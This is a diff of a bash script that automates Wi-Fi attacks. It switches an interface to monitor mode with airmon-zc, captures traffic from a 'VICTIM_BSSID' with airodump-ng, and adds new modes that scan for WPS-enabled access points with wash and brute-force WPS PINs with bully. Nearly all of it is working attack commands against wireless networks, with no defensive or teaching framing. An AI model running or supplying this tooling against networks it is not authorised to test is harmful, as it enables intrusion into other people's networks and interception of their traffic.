@@ -1,4 +1,4 @@
-[#!/bin/bash
+#!/bin/bash
 if [[ $(id -u) != 0 ]]; then # Verify we are root if not exit
    echo "Please Run This Script As Root or With Sudo!" 1>&2
    exit 1
@@ -37,25 +37,31 @@ BLD_RED=${txtbld}$(tput setaf 1) # red
 TXT_RST=$(tput sgr0)             # Reset
 WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"
 
-[[ $2 == "recon" ]] && echo "${BLD_TEA}$(cat ${DIR_LOGO}/recon.logo)${TXT_RST}"; sleep 2.5 || echo "${BLD_TEA}$(cat ${DIR_LOGO}/dump.logo)${TXT_RST}"; sleep 2.5
-    	
+if [[ $2 == "recon" ]]; then
+    echo "${BLD_TEA}$(cat ${DIR_LOGO}/recon.logo)${TXT_RST}"; sleep 2.5
+elif [[ $2 == "dump" ]]; then 
+    echo "${BLD_TEA}$(cat ${DIR_LOGO}/dump.logo)${TXT_RST}"; sleep 2.5
+elif [[ $2 == "wash" ]]; then
+    echo "${BLD_TEA}$(cat ${DIR_LOGO}/wash.logo)${TXT_RST}"; sleep 2.5
+fi
+
 if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; airmon-zc stop $MON; fi
 
 get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
 get_name "CHAN="; CHAN=$USE
+get_name "BSSID="; BSSID=$USE
 [[ -n $(rfkill list | grep yes) ]] && rfkill unblock 0
 
 doit()
 {
-	if [[ -z $(ip addr | grep -i "$MON") ]]; then 
+    if [[ -z $(ip addr | grep -i "$MON") ]]; then 
         iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
         airmon-zc start $IFACE1
     fi
-	sleep 1
-
+    sleep 1
     if [[ $JOB == "recon" ]]; then
-	    xterm -hold -bg black -fg blue -T "Recon" -geometry 90x20 -e airodump-ng $MON &>/dev/null &
-	else
+        xterm -hold -bg black -fg blue -T "Recon" -geometry 90x20 -e airodump-ng $MON &>/dev/null &
+    elif [[ $JOB == "dump" ]]; then
         if [[ -f ${sessionfolder}/${VICTIM_BSSID}* ]]; then
             read -p "${VICTIM_BSSID}.cap exists already. Continuing will remove the file. Continue anyways? [y/n]" option
             if [[ $option != [Yy] ]];
@@ -63,8 +69,14 @@ doit()
             else
                 rm ${sessionfolder}/${VICTIM_BSSID}*
             fi
-	    fi
+	fi
         xterm -hold -bg black -fg blue -T "Dump" -geometry 90x20 -e airodump-ng --bssid $VICTIM_BSSID -c $CHAN -w ${sessionfolder}/$VICTIM_BSSID $MON &>/dev/null &
+    elif [[ $JOB == "wash" ]]; then
+        sudo wash -i $MON --ignore-fcs
+    elif [[ $JOB == "bully" ]]; then
+        sudo bully -b $BSSID -c $CHAN -B $MON
+    else
+      echo "error that can't happen happened"
     fi
 }
 
